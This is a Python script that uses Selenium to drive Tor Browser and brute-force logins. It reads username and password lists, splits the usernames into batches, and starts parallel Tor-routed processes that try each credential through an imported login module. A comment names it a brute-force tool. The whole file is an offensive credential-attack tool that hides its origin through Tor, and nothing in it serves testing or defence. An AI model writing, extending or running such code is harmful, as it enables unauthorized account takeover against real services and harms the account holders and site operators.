import time
import math

from LoginModule import Login
from SeleniumManager import SeleniumManager as TorSelenium
from multiprocessing import Process


def main_parallel():  # TODO: BRUTEFORCE PARALLEL TOR PROCESS
    num_files = 8

    tor_folder_path = "/Applications/Tor Browser.app"
    firefox_binary_path = "/Applications/Tor Browser.app/Contents/MacOS/firefox"
    profile_paths = []  # TODO: your tor profiles path

    with open('usernames.txt', 'r') as f:
        usernames = f.read().splitlines()
    with open('passwords.txt', 'r') as f:
        passwords = f.read().splitlines()

    batch_size = math.ceil(len(usernames) / num_files)

    for i in range(num_files):
        batch_start = i * batch_size
        batch_end = min(batch_start + batch_size, len(usernames))
        batch_usernames = usernames[batch_start:batch_end]
        with open(f'usernames_{i}.txt', 'w') as f:
            f.write('\n'.join(batch_usernames))

    # Create a list to hold all the bot instances
    bots = []
    for profile_path in profile_paths:
        bot = TorSelenium(tor_folder_path, profile_path, firefox_binary_path)
        bots.append(bot)

    # Create a list to hold all the login process instances
    login_processes = []
    for i in range(len(bots)):
        with open(f"usernames_{i}.txt", 'r') as f:
            batch_usernames = f.read().splitlines()
        login_process = Process(target=run_login_process, args=(bots[i], batch_usernames, passwords))
        login_processes.append(login_process)

    # Start all the login processes
    for process in login_processes:
        process.start()

    # Wait for all the login processes to finish
    for process in login_processes:
        process.join()


def run_login_process(bot, usernames, passwords):
    bot.start_tor()
    time.sleep(3)
    time.sleep(60)
    Login.login_all_users(bot, usernames, passwords)


def main():
    tor_folder_path = "/Applications/Tor Browser.app"
    profile_path1 = "/Users/WRITE_YOUR_USER/Library/Application Support/TorBrowser-Data/Browser/" \
                    "YOUR_PROFILE_NAME.default"
    firefox_binary_path = "/Applications/Tor Browser.app/Contents/MacOS/firefox"

    with open('usernames.txt', 'r') as f:
        usernames = f.read().splitlines()
    with open('passwords.txt', 'r') as f:
        passwords = f.read().splitlines()

    bot = TorSelenium(tor_folder_path, profile_path1, firefox_binary_path)

    bot.start_tor()
    time.sleep(3)
    time.sleep(60)
    Login.login_all_users(bot, usernames, passwords)


if __name__ == '__main__':
    main()
